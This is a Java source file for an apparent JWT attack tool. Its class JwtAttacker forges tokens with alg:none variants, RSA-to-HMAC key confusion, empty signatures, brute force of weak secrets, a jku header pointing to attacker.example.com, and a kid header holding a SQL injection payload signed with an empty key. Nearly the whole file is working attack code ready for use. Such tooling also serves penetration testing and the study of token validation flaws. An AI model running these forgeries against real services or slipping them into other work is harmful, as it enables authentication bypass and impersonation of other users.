package com.bulletdev.jhasher.core.jwt;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Type;
import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public class JwtAttacker {

    private static final Gson GSON = new Gson();
    private static final Type MAP_TYPE = new TypeToken<LinkedHashMap<String, Object>>() {}.getType();
    private static final Base64.Encoder URL_ENCODER = Base64.getUrlEncoder().withoutPadding();
    private static final Base64.Decoder URL_DECODER = Base64.getUrlDecoder();

    private static final Map<String, String> ALG_TO_HMAC = Map.of(
            "HS256", "HmacSHA256",
            "HS384", "HmacSHA384",
            "HS512", "HmacSHA512"
    );

    public record AttackResult(
            String attackName,
            boolean success,
            String description,
            String forgedToken
    ) {}

    /**
     * Run all available attacks against the token.
     */
    public List<AttackResult> runAll(String token, Map<String, String> options) {
        List<AttackResult> results = new ArrayList<>();

        results.addAll(algNone(token));

        byte[] publicKey = options.containsKey("publicKey")
                ? options.get("publicKey").getBytes(StandardCharsets.UTF_8)
                : null;
        if (publicKey != null) {
            results.add(hmacConfusion(token, publicKey));
        }

        results.add(nullSignature(token));

        List<String> secrets = loadDefaultSecrets();
        if (options.containsKey("wordlist")) {
            // Optionally user can pass a comma-separated list of additional secrets
            String[] extra = options.get("wordlist").split(",");
            for (String s : extra) {
                String trimmed = s.trim();
                if (!trimmed.isEmpty()) {
                    secrets.add(trimmed);
                }
            }
        }
        results.add(weakSecretBruteForce(token, secrets));

        String attackerUrl = options.getOrDefault("jkuUrl", "https://attacker.example.com/.well-known/jwks.json");
        results.add(jkuInjection(token, attackerUrl));

        results.add(kidSqlInjection(token));

        return results;
    }

    /**
     * Run a single named attack.
     */
    public AttackResult runAttack(String name, String token, Map<String, String> options) {
        return switch (name.toLowerCase()) {
            case "alg-none", "algnone" -> {
                List<AttackResult> results = algNone(token);
                yield results.isEmpty()
                        ? new AttackResult("alg-none", false, "No alg:none variants generated", "")
                        : results.getFirst();
            }
            case "hmac-confusion", "hmacconfusion" -> {
                String pk = options.get("publicKey");
                if (pk == null) {
                    yield new AttackResult("hmac-confusion", false, "Public key required for HMAC confusion attack", "");
                }
                yield hmacConfusion(token, pk.getBytes(StandardCharsets.UTF_8));
            }
            case "null-signature", "nullsignature" -> nullSignature(token);
            case "weak-secret", "weaksecret", "brute-force", "bruteforce" -> {
                List<String> secrets = loadDefaultSecrets();
                yield weakSecretBruteForce(token, secrets);
            }
            case "jku-injection", "jkuinjection" -> {
                String url = options.getOrDefault("jkuUrl", "https://attacker.example.com/.well-known/jwks.json");
                yield jkuInjection(token, url);
            }
            case "kid-sqli", "kidsqlinjection" -> kidSqlInjection(token);
            default -> new AttackResult(name, false, "Unknown attack: " + name, "");
        };
    }

    /**
     * a) alg:none attack - set header algorithm to "none" variants and remove signature.
     */
    public List<AttackResult> algNone(String token) {
        List<AttackResult> results = new ArrayList<>();
        String[] variants = {"none", "None", "NONE", "nOnE"};

        String[] parts = token.split("\\.");
        if (parts.length < 2) {
            results.add(new AttackResult("alg-none", false, "Invalid JWT format", ""));
            return results;
        }

        Map<String, Object> header = decodeJsonPart(parts[0]);

        for (String variant : variants) {
            try {
                Map<String, Object> modifiedHeader = new LinkedHashMap<>(header);
                modifiedHeader.put("alg", variant);
                String newHeader = base64UrlEncode(GSON.toJson(modifiedHeader));
                String forgedToken = newHeader + "." + parts[1] + ".";
                results.add(new AttackResult(
                        "alg-none(" + variant + ")",
                        true,
                        "Set algorithm to '" + variant + "' and removed signature",
                        forgedToken
                ));
            } catch (Exception e) {
                results.add(new AttackResult("alg-none(" + variant + ")", false, "Error: " + e.getMessage(), ""));
            }
        }

        return results;
    }

    /**
     * b) HMAC confusion - change RSA alg to HS256 and sign with public key as HMAC secret.
     */
    public AttackResult hmacConfusion(String token, byte[] publicKey) {
        try {
            String[] parts = token.split("\\.");
            if (parts.length < 2) {
                return new AttackResult("hmac-confusion", false, "Invalid JWT format", "");
            }

            Map<String, Object> header = decodeJsonPart(parts[0]);
            String alg = String.valueOf(header.getOrDefault("alg", ""));

            if (!alg.startsWith("RS")) {
                return new AttackResult("hmac-confusion", false,
                        "Token algorithm is '" + alg + "', not RSA - attack not applicable", "");
            }

            // Change to HS256 and sign with public key
            Map<String, Object> modifiedHeader = new LinkedHashMap<>(header);
            modifiedHeader.put("alg", "HS256");

            String newHeader = base64UrlEncode(GSON.toJson(modifiedHeader));
            String signingInput = newHeader + "." + parts[1];
            String signature = hmacSign(signingInput, publicKey, "HmacSHA256");

            return new AttackResult("hmac-confusion", true,
                    "Changed algorithm from " + alg + " to HS256, signed with public key as HMAC secret",
                    signingInput + "." + signature);
        } catch (Exception e) {
            return new AttackResult("hmac-confusion", false, "Error: " + e.getMessage(), "");
        }
    }

    /**
     * c) Null signature - keep header algorithm but set signature to empty string.
     */
    public AttackResult nullSignature(String token) {
        try {
            String[] parts = token.split("\\.");
            if (parts.length < 2) {
                return new AttackResult("null-signature", false, "Invalid JWT format", "");
            }

            String forgedToken = parts[0] + "." + parts[1] + ".";
            return new AttackResult("null-signature", true,
                    "Kept original algorithm in header but set signature to empty string",
                    forgedToken);
        } catch (Exception e) {
            return new AttackResult("null-signature", false, "Error: " + e.getMessage(), "");
        }
    }

    /**
     * d) Weak secret brute-force - try common secrets against HMAC-signed tokens.
     */
    public AttackResult weakSecretBruteForce(String token, List<String> secrets) {
        try {
            String[] parts = token.split("\\.");
            if (parts.length != 3) {
                return new AttackResult("weak-secret", false, "Invalid JWT format - expected 3 parts", "");
            }

            Map<String, Object> header = decodeJsonPart(parts[0]);
            String alg = String.valueOf(header.getOrDefault("alg", ""));

            String hmacAlgorithm = ALG_TO_HMAC.get(alg);
            if (hmacAlgorithm == null) {
                return new AttackResult("weak-secret", false,
                        "Token algorithm '" + alg + "' is not HMAC - brute-force not applicable", "");
            }

            String signingInput = parts[0] + "." + parts[1];
            String actualSignature = parts[2];

            for (String secret : secrets) {
                String computed = hmacSign(signingInput, secret.getBytes(StandardCharsets.UTF_8), hmacAlgorithm);
                if (computed.equals(actualSignature)) {
                    return new AttackResult("weak-secret", true,
                            "Found signing secret: \"" + secret + "\"",
                            token);
                }
            }

            return new AttackResult("weak-secret", false,
                    "Tried " + secrets.size() + " secrets - none matched", "");
        } catch (Exception e) {
            return new AttackResult("weak-secret", false, "Error: " + e.getMessage(), "");
        }
    }

    /**
     * e) JKU injection - add jku header pointing to attacker-controlled URL.
     */
    public AttackResult jkuInjection(String token, String attackerUrl) {
        try {
            String[] parts = token.split("\\.");
            if (parts.length < 2) {
                return new AttackResult("jku-injection", false, "Invalid JWT format", "");
            }

            Map<String, Object> header = decodeJsonPart(parts[0]);
            Map<String, Object> modifiedHeader = new LinkedHashMap<>(header);
            modifiedHeader.put("jku", attackerUrl);

            String newHeader = base64UrlEncode(GSON.toJson(modifiedHeader));
            String forgedToken = newHeader + "." + parts[1] + ".";

            return new AttackResult("jku-injection", true,
                    "Added jku header pointing to: " + attackerUrl,
                    forgedToken);
        } catch (Exception e) {
            return new AttackResult("jku-injection", false, "Error: " + e.getMessage(), "");
        }
    }

    /**
     * f) KID SQL injection - set kid to SQL injection payload, sign with derived key.
     */
    public AttackResult kidSqlInjection(String token) {
        try {
            String[] parts = token.split("\\.");
            if (parts.length < 2) {
                return new AttackResult("kid-sqli", false, "Invalid JWT format", "");
            }

            Map<String, Object> header = decodeJsonPart(parts[0]);
            Map<String, Object> modifiedHeader = new LinkedHashMap<>(header);

            // SQL injection payload that resolves to empty/known value
            String sqlPayload = "' UNION SELECT '' -- ";
            modifiedHeader.put("kid", sqlPayload);
            modifiedHeader.put("alg", "HS256");

            String newHeader = base64UrlEncode(GSON.toJson(modifiedHeader));
            String signingInput = newHeader + "." + parts[1];

            // Sign with empty string as the key (the SQL injection returns empty)
            String signature = hmacSign(signingInput, new byte[0], "HmacSHA256");

            return new AttackResult("kid-sqli", true,
                    "Set kid to SQL injection payload: " + sqlPayload + " and signed with derived empty key",
                    signingInput + "." + signature);
        } catch (Exception e) {
            return new AttackResult("kid-sqli", false, "Error: " + e.getMessage(), "");
        }
    }

    // --- Internal helpers ---

    private List<String> loadDefaultSecrets() {
        List<String> secrets = new ArrayList<>();
        try (InputStream is = getClass().getClassLoader().getResourceAsStream("data/weak-jwt-secrets.json")) {
            if (is != null) {
                Type listType = new TypeToken<List<String>>() {}.getType();
                List<String> loaded = GSON.fromJson(new InputStreamReader(is, StandardCharsets.UTF_8), listType);
                if (loaded != null) {
                    secrets.addAll(loaded);
                }
            }
        } catch (Exception e) {
            // Fall back to a minimal default list
            secrets.addAll(List.of("secret", "password", "123456", "changeme", "test", "key"));
        }
        return secrets;
    }

    private Map<String, Object> decodeJsonPart(String base64Part) {
        String padded = padBase64(base64Part);
        byte[] decoded = URL_DECODER.decode(padded);
        String json = new String(decoded, StandardCharsets.UTF_8);
        return GSON.fromJson(json, MAP_TYPE);
    }

    private String padBase64(String base64) {
        int remainder = base64.length() % 4;
        if (remainder == 2) {
            return base64 + "==";
        } else if (remainder == 3) {
            return base64 + "=";
        }
        return base64;
    }

    private String base64UrlEncode(String data) {
        return URL_ENCODER.encodeToString(data.getBytes(StandardCharsets.UTF_8));
    }

    private String hmacSign(String input, byte[] keyBytes, String hmacAlgorithm) {
        try {
            Mac mac = Mac.getInstance(hmacAlgorithm);
            mac.init(new SecretKeySpec(keyBytes, hmacAlgorithm));
            byte[] signature = mac.doFinal(input.getBytes(StandardCharsets.UTF_8));
            return URL_ENCODER.encodeToString(signature);
        } catch (NoSuchAlgorithmException | InvalidKeyException e) {
            return "";
        }
    }
}
